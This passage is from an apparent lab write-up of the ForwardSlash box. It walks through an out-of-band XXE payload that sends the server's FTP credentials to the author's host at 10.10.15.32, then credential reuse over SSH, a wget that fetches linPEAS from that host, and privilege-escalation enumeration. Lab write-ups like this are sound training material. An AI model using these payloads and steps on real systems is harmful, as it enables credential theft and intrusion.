</span></span></code></pre></td></tr></table></div></div><p>Yes! We obtained the HTML code of the dev endpoint:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>	<span class=p>&lt;</span><span class=nt>h1</span><span class=p>&gt;</span>XML Api Test<span class=p>&lt;/</span><span class=nt>h1</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>	<span class=p>&lt;</span><span class=nt>h3</span><span class=p>&gt;</span>This is our api test for when our new website gets refurbished<span class=p>&lt;/</span><span class=nt>h3</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>	<span class=p>&lt;</span><span class=nt>form</span> <span class=na>action</span><span class=o>=</span><span class=s>&#34;/dev/index.php&#34;</span> <span class=na>method</span><span class=o>=</span><span class=s>&#34;get&#34;</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;xmltest&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>		<span class=p>&lt;</span><span class=nt>textarea</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;xml&#34;</span> <span class=na>form</span><span class=o>=</span><span class=s>&#34;xmltest&#34;</span> <span class=na>rows</span><span class=o>=</span><span class=s>&#34;20&#34;</span> <span class=na>cols</span><span class=o>=</span><span class=s>&#34;50&#34;</span><span class=p>&gt;&lt;</span><span class=nt>api</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>request</span><span class=p>&gt;</span>test<span class=p>&lt;/</span><span class=nt>request</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>api</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>textarea</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>		<span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;submit&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>	<span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>&lt;!-- TODO:
</span></span></span><span class=line><span class=cl><span class=c>Fix FTP Login
</span></span></span><span class=line><span class=cl><span class=c>--&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>It&rsquo;s talking about XML and FTP login as said in the deface.</p><p>Let&rsquo;s try to send a default request to the XML api:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /profilepicture.php HTTP/1.1
</span></span><span class=line><span class=cl>Host: backup.forwardslash.htb
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>Cookie: PHPSESSID=mbmjmv76c2veso4c1ihneuh5bt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>url=http://backup.forwardslash.htb/dev/index.php?xml=&lt;cyfun&gt;&lt;/cyfun&gt;
</span></span></code></pre></td></tr></table></div></div><p>Nothing fancy yet.</p><h3 id=http-exploitation-xxe>HTTP exploitation: XXE<a hidden class=anchor aria-hidden=true href=#http-exploitation-xxe>#</a></h3><p>We noticed in the HTML code the following structure:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;api&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;request&gt;</span>test<span class=nt>&lt;/request&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/api&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>So let&rsquo;s try to forge a simple XXE payload using it:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; ?&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE replace [&lt;!ENTITY xxe &#34;cyfun&#34;&gt;</span>]&gt;
</span></span><span class=line><span class=cl><span class=nt>&lt;api&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;request&gt;</span><span class=ni>&amp;xxe;</span><span class=nt>&lt;/request&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/api&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>So I tried to send something like that:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>url=http://backup.forwardslash.htb/dev/index.php?xml%3d&lt;?xml%20version%3d&#34;1.0&#34;%20?&gt;&lt;!DOCTYPE%20replace%20[&lt;!ENTITY%20xxe%20&#34;cyfun&#34;&gt;]&gt;&lt;api&gt;%20%20&lt;request&gt;%26xxe;&lt;/request&gt;&lt;/api&gt;
</span></span></code></pre></td></tr></table></div></div><p>But this doesn&rsquo;t work. But let&rsquo;s remember the FTP hint!</p><p>Maybe the XXE is OOB (Out Of Band) only. In general, working with FTP for OOB is far better
than HTTP as it wil allows us to retrieve the whole file rather than the 1st line.
Here I don&rsquo;t think we will retrieve files but rather credentials as it&rsquo;s said there
is a FTP autologin feature. So we won&rsquo;t need a complex payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; ?&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE root [
</span></span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY % ext SYSTEM &#34;ftp://10.10.15.32/&#34;&gt;</span> %ext;
</span></span><span class=line><span class=cl>]&gt;
</span></span><span class=line><span class=cl><span class=nt>&lt;api&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;request&gt;</span>
</span></span><span class=line><span class=cl>    dontcare
</span></span><span class=line><span class=cl>  <span class=nt>&lt;/request&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/api&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>Our payload will look like this:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>url=http://backup.forwardslash.htb/dev/index.php?xml%3d&lt;%3fxml%2520version%253d&#34;1.0&#34;%2520%3f&gt;&lt;!DOCTYPE%2520root%2520[&lt;!ENTITY%2520%25%2520ext%2520SYSTEM%2520&#34;ftp%3a//10.10.15.32/&#34;&gt;%2520%25ext%3b]&gt;&lt;api&gt;&lt;request&gt;dontcare&lt;/request&gt;&lt;/api&gt;
</span></span></code></pre></td></tr></table></div></div><p>PS: even if <a href=https://portswigger.net/burp>burp</a> automatically URL encode key character for us we need to double
encore the key character in the xml payload for the request to work.</p><p>But before let&rsquo;s start [xxeserv][xxeserv], a fake FTP server, then, when submitting the request we
will receive the credentials:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ sudo xxeserv -p 21
</span></span><span class=line><span class=cl>[*] UNO Listening...
</span></span><span class=line><span class=cl>2020/07/05 19:32:51 [*] GO XXE FTP Server - Port:  21
</span></span><span class=line><span class=cl>2020/07/05 19:32:55 [*] Connection Accepted from [10.10.10.183:50146]
</span></span><span class=line><span class=cl>USER:  chiv
</span></span><span class=line><span class=cl>PASS:  N0bodyL1kesBack/
</span></span><span class=line><span class=cl>2020/07/05 19:32:55 [x] Connection Closed
</span></span><span class=line><span class=cl>2020/07/05 19:32:55 [*] Closing FTP Connection
</span></span></code></pre></td></tr></table></div></div><p>Two important things were required here:</p><ul><li>running the FTP server on port 21 (eg. port 2121 was filtered)</li><li>adding a leading slash to the request (eg. <code>ftp://10.10.15.32/</code> works but <code>ftp://10.10.15.32</code> not)</li></ul><h3 id=network-exploitation-credential-stuffing>Network exploitation: credential stuffing<a hidden class=anchor aria-hidden=true href=#network-exploitation-credential-stuffing>#</a></h3><p>Let&rsquo;s see if we can re-use the FTP credentials on SSH:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>ssh</span> <span class=n>chiv</span><span class=err>@</span><span class=n>forwardslash</span><span class=o>.</span><span class=n>htb</span>
</span></span><span class=line><span class=cl><span class=n>The</span> <span class=n>authenticity</span> <span class=n>of</span> <span class=n>host</span> <span class=s1>&#39;forwardslash.htb (10.10.10.183)&#39;</span> <span class=n>can</span><span class=s1>&#39;t be established.</span>
</span></span><span class=line><span class=cl><span class=n>ECDSA</span> <span class=n>key</span> <span class=n>fingerprint</span> <span class=n>is</span> <span class=n>SHA256</span><span class=p>:</span><span class=mi>7</span><span class=n>DrtoyB3GmTDLmPm01m7dHeoaPjA7</span><span class=o>+</span><span class=n>ixb3GDFhGn0HM</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=n>Are</span> <span class=n>you</span> <span class=n>sure</span> <span class=n>you</span> <span class=n>want</span> <span class=n>to</span> <span class=k>continue</span> <span class=n>connecting</span> <span class=p>(</span><span class=n>yes</span><span class=o>/</span><span class=n>no</span><span class=o>/</span><span class=p>[</span><span class=n>fingerprint</span><span class=p>])</span><span class=err>?</span> <span class=n>yes</span>
</span></span><span class=line><span class=cl><span class=n>Warning</span><span class=p>:</span> <span class=n>Permanently</span> <span class=n>added</span> <span class=s1>&#39;forwardslash.htb,10.10.10.183&#39;</span> <span class=p>(</span><span class=n>ECDSA</span><span class=p>)</span> <span class=n>to</span> <span class=n>the</span> <span class=n>list</span> <span class=n>of</span> <span class=n>known</span> <span class=n>hosts</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=n>chiv</span><span class=err>@</span><span class=n>forwardslash</span><span class=o>.</span><span class=n>htb</span><span class=s1>&#39;s password:</span>
</span></span><span class=line><span class=cl><span class=n>Welcome</span> <span class=n>to</span> <span class=n>Ubuntu</span> <span class=mf>18.04</span><span class=o>.</span><span class=mi>4</span> <span class=n>LTS</span> <span class=p>(</span><span class=n>GNU</span><span class=o>/</span><span class=n>Linux</span> <span class=mf>4.15</span><span class=o>.</span><span class=mi>0</span><span class=o>-</span><span class=mi>91</span><span class=o>-</span><span class=n>generic</span> <span class=n>x86_64</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>*</span> <span class=n>Documentation</span><span class=p>:</span>  <span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>help</span><span class=o>.</span><span class=n>ubuntu</span><span class=o>.</span><span class=n>com</span>
</span></span><span class=line><span class=cl> <span class=o>*</span> <span class=n>Management</span><span class=p>:</span>     <span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>landscape</span><span class=o>.</span><span class=n>canonical</span><span class=o>.</span><span class=n>com</span>
</span></span><span class=line><span class=cl> <span class=o>*</span> <span class=n>Support</span><span class=p>:</span>        <span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>ubuntu</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=n>advantage</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>System</span> <span class=n>information</span> <span class=n>as</span> <span class=n>of</span> <span class=n>Sun</span> <span class=n>Jul</span>  <span class=mi>5</span> <span class=mi>17</span><span class=p>:</span><span class=mi>42</span><span class=p>:</span><span class=mi>11</span> <span class=n>UTC</span> <span class=mi>2020</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>System</span> <span class=nb>load</span><span class=p>:</span>  <span class=mf>0.0</span>                <span class=n>Processes</span><span class=p>:</span>            <span class=mi>196</span>
</span></span><span class=line><span class=cl>  <span class=n>Usage</span> <span class=n>of</span> <span class=o>/</span><span class=p>:</span>   <span class=mf>30.8</span><span class=o>%</span> <span class=n>of</span> <span class=mf>19.56</span><span class=n>GB</span>   <span class=n>Users</span> <span class=n>logged</span> <span class=ow>in</span><span class=p>:</span>      <span class=mi>0</span>
</span></span><span class=line><span class=cl>  <span class=n>Memory</span> <span class=n>usage</span><span class=p>:</span> <span class=mi>19</span><span class=o>%</span>                <span class=ne>IP</span> <span class=n>address</span> <span class=k>for</span> <span class=n>ens33</span><span class=p>:</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.183</span>
</span></span><span class=line><span class=cl>  <span class=n>Swap</span> <span class=n>usage</span><span class=p>:</span>   <span class=mi>0</span><span class=o>%</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>*</span> <span class=n>Canonical</span> <span class=n>Livepatch</span> <span class=n>is</span> <span class=n>available</span> <span class=k>for</span> <span class=n>installation</span><span class=o>.</span>
</span></span><span class=line><span class=cl>   <span class=o>-</span> <span class=n>Reduce</span> <span class=n>system</span> <span class=n>reboots</span> <span class=ow>and</span> <span class=n>improve</span> <span class=n>kernel</span> <span class=n>security</span><span class=o>.</span> <span class=n>Activate</span> <span class=n>at</span><span class=p>:</span>
</span></span><span class=line><span class=cl>     <span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>ubuntu</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=n>livepatch</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=mi>16</span> <span class=n>packages</span> <span class=n>can</span> <span class=n>be</span> <span class=n>updated</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=mi>0</span> <span class=n>updates</span> <span class=n>are</span> <span class=n>security</span> <span class=n>updates</span><span class=o>.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Failed</span> <span class=n>to</span> <span class=n>connect</span> <span class=n>to</span> <span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>changelogs</span><span class=o>.</span><span class=n>ubuntu</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=n>meta</span><span class=o>-</span><span class=n>release</span><span class=o>-</span><span class=n>lts</span><span class=o>.</span> <span class=n>Check</span> <span class=n>your</span> <span class=n>Internet</span> <span class=n>connection</span> <span class=ow>or</span> <span class=n>proxy</span> <span class=n>settings</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Last</span> <span class=n>login</span><span class=p>:</span> <span class=n>Sun</span> <span class=n>Jul</span>  <span class=mi>5</span> <span class=mi>15</span><span class=p>:</span><span class=mi>11</span><span class=p>:</span><span class=mi>43</span> <span class=mi>2020</span> <span class=n>from</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>14.230</span>
</span></span><span class=line><span class=cl><span class=n>chiv</span><span class=err>@</span><span class=n>forwardslash</span><span class=p>:</span><span class=o>~$</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=system-enumeration>System enumeration<a hidden class=anchor aria-hidden=true href=#system-enumeration>#</a></h3><p>Let&rsquo;s see what is inside <code>/var/backups/</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>chiv</span><span class=err>@</span><span class=n>forwardslash</span><span class=p>:</span><span class=o>~$</span> <span class=n>ls</span> <span class=o>-</span><span class=n>lhA</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>backups</span><span class=o>/</span>
</span></span><span class=line><span class=cl><span class=n>total</span> <span class=mi>804</span><span class=n>K</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>r</span><span class=o>--</span><span class=n>r</span><span class=o>--</span> <span class=mi>1</span> <span class=n>root</span> <span class=n>root</span>            <span class=mi>60</span><span class=n>K</span> <span class=n>Mar</span> <span class=mi>24</span> <span class=mi>06</span><span class=p>:</span><span class=mi>25</span> <span class=n>alternatives</span><span class=o>.</span><span class=n>tar</span><span class=o>.</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>r</span><span class=o>--</span><span class=n>r</span><span class=o>--</span> <span class=mi>1</span> <span class=n>root</span> <span class=n>root</span>            <span class=mi>38</span><span class=n>K</span> <span class=n>Mar</span> <span class=mi>24</span> <span class=mi>06</span><span class=p>:</span><span class=mi>17</span> <span class=n>apt</span><span class=o>.</span><span class=n>extended_states</span><span class=o>.</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>r</span><span class=o>--</span><span class=n>r</span><span class=o>--</span> <span class=mi>1</span> <span class=n>root</span> <span class=n>root</span>           <span class=mf>4.1</span><span class=n>K</span> <span class=n>Mar</span>  <span class=mi>6</span> <span class=mi>14</span><span class=p>:</span><span class=mi>17</span> <span class=n>apt</span><span class=o>.</span><span class=n>extended_states</span><span class=o>.</span><span class=mf>1.</span><span class=n>gz</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>r</span><span class=o>--</span><span class=n>r</span><span class=o>--</span> <span class=mi>1</span> <span class=n>root</span> <span class=n>root</span>           <span class=mf>3.9</span><span class=n>K</span> <span class=n>Mar</span>  <span class=mi>5</span> <span class=mi>14</span><span class=p>:</span><span class=mi>46</span> <span class=n>apt</span><span class=o>.</span><span class=n>extended_states</span><span class=o>.</span><span class=mf>2.</span><span class=n>gz</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-------</span> <span class=mi>1</span> <span class=n>pain</span> <span class=n>pain</span>            <span class=mi>526</span> <span class=n>Jun</span> <span class=mi>21</span>  <span class=mi>2019</span> <span class=n>config</span><span class=o>.</span><span class=n>php</span><span class=o>.</span><span class=n>bak</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>r</span><span class=o>--</span><span class=n>r</span><span class=o>--</span> <span class=mi>1</span> <span class=n>root</span> <span class=n>root</span>            <span class=mi>437</span> <span class=n>Mar</span>  <span class=mi>5</span> <span class=mi>14</span><span class=p>:</span><span class=mi>07</span> <span class=n>dpkg</span><span class=o>.</span><span class=n>diversions</span><span class=o>.</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>r</span><span class=o>--</span><span class=n>r</span><span class=o>--</span> <span class=mi>1</span> <span class=n>root</span> <span class=n>root</span>            <span class=mi>207</span> <span class=n>Mar</span>  <span class=mi>5</span> <span class=mi>14</span><span class=p>:</span><span class=mi>47</span> <span class=n>dpkg</span><span class=o>.</span><span class=n>statoverride</span><span class=o>.</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>r</span><span class=o>--</span><span class=n>r</span><span class=o>--</span> <span class=mi>1</span> <span class=n>root</span> <span class=n>root</span>           <span class=mi>653</span><span class=n>K</span> <span class=n>Mar</span> <span class=mi>24</span> <span class=mi>06</span><span class=p>:</span><span class=mi>17</span> <span class=n>dpkg</span><span class=o>.</span><span class=n>status</span><span class=o>.</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-------</span> <span class=mi>1</span> <span class=n>root</span> <span class=n>root</span>            <span class=mi>730</span> <span class=n>Mar</span> <span class=mi>17</span> <span class=mi>20</span><span class=p>:</span><span class=mi>13</span> <span class=n>group</span><span class=o>.</span><span class=n>bak</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-------</span> <span class=mi>1</span> <span class=n>root</span> <span class=n>shadow</span>          <span class=mi>604</span> <span class=n>Mar</span> <span class=mi>17</span> <span class=mi>20</span><span class=p>:</span><span class=mi>13</span> <span class=n>gshadow</span><span class=o>.</span><span class=n>bak</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>r</span><span class=o>--</span><span class=n>r</span><span class=o>--</span><span class=n>r</span><span class=o>--</span> <span class=mi>1</span> <span class=n>root</span> <span class=n>root</span>            <span class=mi>129</span> <span class=n>May</span> <span class=mi>27</span>  <span class=mi>2019</span> <span class=n>note</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-------</span> <span class=mi>1</span> <span class=n>root</span> <span class=n>root</span>           <span class=mf>1.7</span><span class=n>K</span> <span class=n>Mar</span>  <span class=mi>5</span> <span class=mi>14</span><span class=p>:</span><span class=mi>46</span> <span class=n>passwd</span><span class=o>.</span><span class=n>bak</span>
</span></span><span class=line><span class=cl><span class=n>drwxrwx</span><span class=o>---</span> <span class=mi>2</span> <span class=n>root</span> <span class=n>backupoperator</span> <span class=mf>4.0</span><span class=n>K</span> <span class=n>May</span> <span class=mi>27</span>  <span class=mi>2019</span> <span class=n>recovery</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-------</span> <span class=mi>1</span> <span class=n>root</span> <span class=n>shadow</span>         <span class=mf>1.2</span><span class=n>K</span> <span class=n>Mar</span>  <span class=mi>6</span> <span class=mi>14</span><span class=p>:</span><span class=mi>21</span> <span class=n>shadow</span><span class=o>.</span><span class=n>bak</span>
</span></span></code></pre></td></tr></table></div></div><p>There are:</p><ul><li><code>config.php.bak</code> owned by pain</li><li><code>note.txt</code> which is world readable</li><li><code>recovery</code> folder owned by the <code>backupoperator</code> group</li></ul><p>The only thing we can read for now is <code>note.txt</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Chiv, this is the backup of the old config, the one with the password we need to actually keep safe. Please DO NOT TOUCH.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-Pain
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s try to enumerate more with the help of linPEAS (from [PEASS][PEASS]).</p><p>We have <code>/usr/share/peass/linPEAS/linpeas.sh</code>, let&rsquo;s just serve it via HTTP:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ruby -run -e httpd /usr/share/peass/linPEAS/ -p 8888
</span></span><span class=line><span class=cl>[2020-07-05 20:13:39] INFO  WEBrick 1.6.0
</span></span><span class=line><span class=cl>[2020-07-05 20:13:39] INFO  ruby 2.7.1 (2020-03-31) [x86_64-linux]
</span></span><span class=line><span class=cl>[2020-07-05 20:13:39] INFO  WEBrick::HTTPServer#start: pid=117003 port=8888
</span></span></code></pre></td></tr></table></div></div><p>Now let&rsquo;s download it on the box:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>chiv@forwardslash:/tmp/cyfun$ wget http://10.10.15.32:8888/linpeas.sh
</span></span><span class=line><span class=cl>chiv@forwardslash:/tmp/cyfun$ chmod u+x linpeas.sh
</span></span></code></pre></td></tr></table></div></div><p>In the SUID section we can see an unusual <code>/usr/bin/backup</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>chiv@forwardslash:~$ ls -lh /usr/bin/backup
</span></span><span class=line><span class=cl>-r-sr-xr-x 1 pain pain 14K Mar  6 10:06 /usr/bin/backup
</span></span></code></pre></td></tr></table></div></div><h3 id=privilege-escalation--from-chiv-to-pain>Privilege Escalation : from chiv to pain<a hidden class=anchor aria-hidden=true href=#privilege-escalation--from-chiv-to-pain>#</a></h3><p><code>backup</code> is owned by pain.</p><p>Let&rsquo;s try to run it:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>chiv@forwardslash:~$ backup
</span></span><span class=line><span class=cl>----------------------------------------------------------------------
</span></span><span class=line><span class=cl>        Pain&#39;s Next-Gen Time Based Backup Viewer
</span></span><span class=line><span class=cl>        v0.1
</span></span><span class=line><span class=cl>        NOTE: not reading the right file yet,
</span></span><span class=line><span class=cl>        only works if backup is taken in same second
</span></span><span class=line><span class=cl>----------------------------------------------------------------------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Current Time: 18:37:43
</span></span><span class=line><span class=cl>ERROR: 01430555472f086a6633fad6bfc18d98 Does Not Exist or Is Not Accessible By Me, Exiting...
</span></span></code></pre></td></tr></table></div></div><p>There is a hash in the error output, let&rsquo;s identify the hash type with :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ haiti 01430555472f086a6633fad6bfc18d98
</span></span><span class=line><span class=cl>MD2 [JtR: md2]
</span></span><span class=line><span class=cl>MD5 [HC: 0] [JtR: raw-md5]
</span></span><span class=line><span class=cl>MD4 [HC: 900] [JtR: raw-md4]
</span></span><span class=line><span class=cl>Double MD5 [HC: 2600]
</span></span><span class=line><span class=cl>LM [HC: 3000] [JtR: lm]
